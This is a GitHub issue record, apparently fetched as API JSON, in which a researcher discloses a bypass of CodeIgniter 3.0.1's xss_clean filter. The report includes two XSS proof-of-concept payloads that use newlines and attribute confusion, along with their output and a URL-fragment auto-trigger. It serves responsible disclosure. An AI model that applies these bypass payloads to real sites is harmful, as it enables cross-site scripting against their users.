{"url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106","repository_url":"https://api.github.com/repos/bcit-ci/CodeIgniter","labels_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106/labels{/name}","comments_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106/comments","events_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/4106/events","html_url":"https://github.com/bcit-ci/CodeIgniter/issues/4106","id":105699978,"node_id":"MDU6SXNzdWUxMDU2OTk5Nzg=","number":4106,"title":"xss_clean-filter bypass using new lines and attribute confusion","user":{"login":"fransr","id":402210,"node_id":"MDQ6VXNlcjQwMjIxMA==","avatar_url":"https://avatars.githubusercontent.com/u/402210?v=4","gravatar_id":"","url":"https://api.github.com/users/fransr","html_url":"https://github.com/fransr","followers_url":"https://api.github.com/users/fransr/followers","following_url":"https://api.github.com/users/fransr/following{/other_user}","gists_url":"https://api.github.com/users/fransr/gists{/gist_id}","starred_url":"https://api.github.com/users/fransr/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/fransr/subscriptions","organizations_url":"https://api.github.com/users/fransr/orgs","repos_url":"https://api.github.com/users/fransr/repos","events_url":"https://api.github.com/users/fransr/events{/privacy}","received_events_url":"https://api.github.com/users/fransr/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":140924,"node_id":"MDU6TGFiZWwxNDA5MjQ=","url":"https://api.github.com/repos/bcit-ci/CodeIgniter/labels/Bug","name":"Bug","color":"eb2420","default":false,"description":null}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":1,"created_at":"2015-09-09T22:56:31Z","updated_at":"2015-09-10T13:57:44Z","closed_at":"2015-09-10T09:48:13Z","author_association":"NONE","type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"Hi,\nI found a way to confuse the `xss_clean` function inside the Security Helper into allowing arbitrary attributes since the function believes the event-attribute is outside the attribute/tag thus not replacing it with `[removed]`. I'm using CodeIgniter 3.0.1. \n\nHere's an example:\n\n```\n<?=xss_clean('<marquee x=\"\n>\"onscroll=alert(1)>')?>\n```\n\nThis will result in the following output:\n\n```\n<marquee x=\"\n>\"onscroll=alert&#40;1&#41;>\n```\n\nThis one will work in Webkit/Firefox, since Blink(Chrome) uses it's own marquee-handler which has deprecated the `onscroll` attribute. However, by using another method you can also trigger it without interaction in Webkit/Blink:\n\n```\n<?=xss_clean('<aside tabindex=0 id=x x=\"\n>\"onfocus=alert(1)>')?>\n```\n\nThis will result in the following output:\n\n```\n<aside tabindex=0 id=x x=\"\n>\"onfocus=alert&#40;1&#41;>\n```\n\n(By visiting the URL with this payload, appending #x to the URL-fragment, the element will focus automatically and trigger the onfocus-event, ie: example.html#x )\n\nRegards,\nFrans Ros√©n\nwww.detectify.com\n","closed_by":{"login":"narfbg","id":1058011,"node_id":"MDQ6VXNlcjEwNTgwMTE=","avatar_url":"https://avatars.githubusercontent.com/u/1058011?v=4","gravatar_id":"","url":"https://api.github.com/users/narfbg","html_url":"https://github.com/narfbg","followers_url":"https://api.github.com/users/narfbg/followers","following_url":"https://api.github.com/users/narfbg/following{/other_user}","gists_url":"https://api.github.com/users/narfbg/gists{/gist_id}","starred_url":"https://api.github.com/users/narfbg/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/narfbg/subscriptions","organizations_url":"https://api.github.com/users/narfbg/orgs","repos_url":"https://api.github.com/users/narfbg/repos","events_url":"https://api.github.com